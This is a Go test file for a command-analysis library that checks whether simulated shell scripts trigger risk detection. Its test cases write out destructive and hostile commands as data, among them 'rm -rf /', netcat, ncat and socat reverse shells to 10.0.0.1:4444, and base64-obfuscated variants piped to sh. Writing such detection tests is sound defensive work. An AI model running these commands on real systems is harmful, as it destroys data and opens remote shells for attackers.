package analysis_test

import (
	"context"
	"errors"
	"testing"

	"github.com/nullptrpanic/libcommand"
	"github.com/nullptrpanic/libcommand/analysis"
)

var (
	_ libcommand.Command = analysis.RM
	_ libcommand.Command = analysis.Poweroff
	_ libcommand.Command = analysis.Reboot
	_ libcommand.Command = analysis.Halt
	_ libcommand.Command = analysis.Shutdown
	_ libcommand.Command = analysis.Init
	_ libcommand.Command = analysis.Telinit
	_ libcommand.Command = analysis.Systemctl
	_ libcommand.Command = analysis.NC
	_ libcommand.Command = analysis.Ncat
	_ libcommand.Command = analysis.Netcat
	_ libcommand.Command = analysis.Socat
)

func TestCommandsDetectTheirHighRiskInvocations(t *testing.T) {
	tests := []*struct {
		name        string
		commandName string
		command     libcommand.Command
		source      string
	}{
		{name: "recursive root deletion", commandName: "rm", command: analysis.RM, source: `rm -rf /`},
		{name: "recursive current root deletion", commandName: "rm", command: analysis.RM, source: `cd /; rm --recursive -- .`},
		{name: "power off", commandName: "poweroff", command: analysis.Poweroff, source: `poweroff`},
		{name: "reboot", commandName: "reboot", command: analysis.Reboot, source: `reboot`},
		{name: "halt", commandName: "halt", command: analysis.Halt, source: `halt`},
		{name: "shutdown", commandName: "shutdown", command: analysis.Shutdown, source: `shutdown now`},
		{name: "init power off", commandName: "init", command: analysis.Init, source: `init 0`},
		{name: "telinit reboot", commandName: "telinit", command: analysis.Telinit, source: `telinit 6`},
		{name: "systemctl power off", commandName: "systemctl", command: analysis.Systemctl, source: `systemctl poweroff`},
		{name: "netcat exec shell", commandName: "nc", command: analysis.NC, source: `nc -e /bin/sh 10.0.0.1 4444`},
		{name: "ncat exec shell", commandName: "ncat", command: analysis.Ncat, source: `ncat --exec=/bin/sh 10.0.0.1 4444`},
		{name: "netcat long name", commandName: "netcat", command: analysis.Netcat, source: `netcat -c /bin/sh 10.0.0.1 4444`},
		{name: "socat exec shell", commandName: "socat", command: analysis.Socat, source: `socat TCP:10.0.0.1:4444 EXEC:/bin/sh`},
		{
			name:        "expanded tcp redirect",
			commandName: "nc",
			command:     analysis.NC,
			source: `target=$(printf '%s' L2Rldi90Y3AvMTAuMC4wLjEvNDQ0NA== | base64 -d)
nc >"$target"`,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			err := simulate(t, test.source, map[string]libcommand.Command{test.commandName: test.command})
			if !errors.Is(err, analysis.ErrRiskDetected) {
				t.Fatalf("error = %v, want ErrRiskDetected", err)
			}
			var detection *analysis.DetectionError
			if !errors.As(err, &detection) {
				t.Fatalf("error = %T %v, want *DetectionError", err, err)
			}
			if detection.Command != test.commandName || detection.Reason == "" {
				t.Fatalf("detection = %#v, want command %q and a reason", detection, test.commandName)
			}
		})
	}
}

func TestOnlyRegisteredAnalysisCommandsAreEnabled(t *testing.T) {
	err := simulate(t, `poweroff`, map[string]libcommand.Command{"rm": analysis.RM})
	if err != nil {
		t.Fatalf("unregistered poweroff analysis returned %v", err)
	}
}

func TestRMDetectsDecodedPipelineExecutedByShell(t *testing.T) {
	err := simulate(t, `echo 'cm0gLXJmIC8=' | base64 -d | sh`, map[string]libcommand.Command{"rm": analysis.RM})
	if !errors.Is(err, analysis.ErrRiskDetected) {
		t.Fatalf("error = %v, want ErrRiskDetected", err)
	}
	var detection *analysis.DetectionError
	if !errors.As(err, &detection) || detection.Command != "rm" {
		t.Fatalf("detection = %#v, want decoded rm invocation", detection)
	}
}

func TestCommandsLeaveSafeAndUnresolvedInvocationsUnresolved(t *testing.T) {
	tests := []*struct {
		name        string
		commandName string
		command     libcommand.Command
		source      string
	}{
		{name: "rm below root", commandName: "rm", command: analysis.RM, source: `rm -rf /tmp/cache`},
		{name: "rm root without recursion", commandName: "rm", command: analysis.RM, source: `rm -f /`},
		{name: "rm unresolved target", commandName: "rm", command: analysis.RM, source: `rm -rf "$RANDOM"`},
		{name: "shutdown cancellation", commandName: "shutdown", command: analysis.Shutdown, source: `shutdown -c`},
		{name: "systemctl status", commandName: "systemctl", command: analysis.Systemctl, source: `systemctl status poweroff`},
		{name: "netcat without exec", commandName: "nc", command: analysis.NC, source: `nc 10.0.0.1 4444`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if err := simulate(t, test.source, map[string]libcommand.Command{test.commandName: test.command}); err != nil {
				t.Fatalf("Simulate() error = %v", err)
			}
		})
	}
}

func simulate(t *testing.T, source string, commands map[string]libcommand.Command) error {
	t.Helper()
	builder := libcommand.NewBuilder()
	for name, command := range commands {
		builder.Command(name, command)
	}
	return builder.Build().Simulate(context.Background(), &libcommand.SimulationRequest{Source: source})
}
